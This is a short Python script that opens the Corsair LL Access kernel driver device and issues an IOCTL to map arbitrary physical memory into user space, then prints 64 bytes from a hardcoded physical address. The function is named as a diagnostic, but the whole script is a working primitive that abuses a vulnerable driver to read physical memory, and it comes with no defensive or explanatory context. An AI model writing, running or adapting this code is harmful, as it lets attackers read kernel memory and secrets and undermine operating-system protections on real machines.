
import ctypes
import struct

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def diag(pa):
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1: return
    
    inp = struct.pack("<QII", pa & ~0xFFF, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    
    if ok and out.value:
        data = bytes((ctypes.c_ubyte * 64).from_address(out.value + (pa & 0xFFF)))
        print(f"PA 0x{pa:X} data: {data.hex(' ')}")
    else:
        print(f"PA 0x{pa:X} map failed")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    diag(0x1AE000)
